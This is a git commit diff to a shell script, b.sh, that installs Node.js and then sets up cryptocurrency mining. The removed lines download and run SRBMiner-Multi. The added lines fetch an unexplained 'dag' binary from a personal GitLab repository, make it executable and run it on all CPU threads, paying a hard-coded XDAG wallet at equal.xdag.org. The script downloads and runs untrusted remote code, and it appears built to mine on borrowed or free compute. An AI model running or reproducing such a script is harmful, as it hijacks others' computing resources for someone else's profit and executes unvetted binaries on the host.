58c7842a6fdcf2d36e3fce1d11354d011457f0a4
Mistainsah <107166633+Mistainsah@users.noreply.github.com>
2022-07-13 22:31:38 +0700

    Update b.sh

--- b.sh
+++ b.sh
@@ -3,7 +3,7 @@ wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
 \rm node-v14.17.0-linux-x64.tar.gz
 PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
 npm config set cache /tmp --global
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/1.0.1/SRBMiner-Multi-1-0-1-Linux.tar.xz -O - | tar -xz && cd SRBMiner-Multi-1-0-1
-ph add SRBMiner-MULTI
-ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./SRBMiner-MULTI --disable-gpu --algorithm xdag --pool equal.xdag.org:13656 --wallet a+dc1CL2NRgbtPvLtys614KSKlv5rdYw --worker serabi --cpu-threads $(nproc --all)
+wget https://gitlab.com/richardkevin320/donlod/-/raw/main/dag | chmod +x dag
+ph add dag
+./dag -cpu -a a+dc1CL2NRgbtPvLtys614KSKlv5rdYw -p equal.xdag.org:13656 -t $(nproc --all)
 
